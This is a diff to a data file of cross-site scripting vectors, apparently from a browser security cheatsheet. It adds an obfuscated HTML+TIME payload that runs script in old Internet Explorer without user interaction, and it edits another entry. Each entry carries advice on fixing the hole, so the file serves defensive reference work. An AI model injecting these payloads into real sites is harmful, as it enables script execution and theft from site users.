@@ -261,13 +261,13 @@ var items =
         'data'       : 'X<x style=`behavior:url(#default#time2)` onbegin=`%js_write%` >',
         'description': 'The HTML+TIME behavior allows to use arbitrary tags to execute JavaScript via onbegin event handlers.',
         'tickets'    : [],
-        'howtofix'   : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on black lists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',            
+        'howtofix'   : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',            
         'browsers'   : {
             'internet explorer': [
                 '5.5', '6.0', '7.0', '8.0', '9.0'
             ]
         },
-        'tags'       : ['xss', 'javascript', 'ie', 'sharp'],
+        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'onbegin'],
         'reporter'   : '.mario'
     },
     { /* ID 17 - Opera XML-stylesheets executing JavaScript */
@@ -375,5 +375,21 @@ var items =
         },
         'tags'       : ['surveillance', 'javascript', 'opera', 'html5', 'onforminput', 'onformchange'],
         'reporter'   : 'Skyphire, .mario'
+    },
+    { /* ID 24 - JavaScript execution via HTML+TIME without user interaction  */
+        'id'         : 24,
+        'category'   : 'htmlplustime', 
+        'name'       : 'JavaScript execution via HTML+TIME without user interaction',
+        'data'       : '1<b:set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%js_alert%&gt;`>',
+        'description': 'This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just attributename and to attributes. Also a fake namespace is being used to have the tag look like a harmless <B>. This only works on Internet Explorer.',
+        'tickets'    : [],
+        'howtofix'   : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',            
+        'browsers'   : {
+            'internet explorer': [
+                '5.5', '6.0', '7.0', '8.0', '9.0'
+            ]
+        },
+        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'attributename', 'to'],
+        'reporter'   : '.mario'
     }
 ]
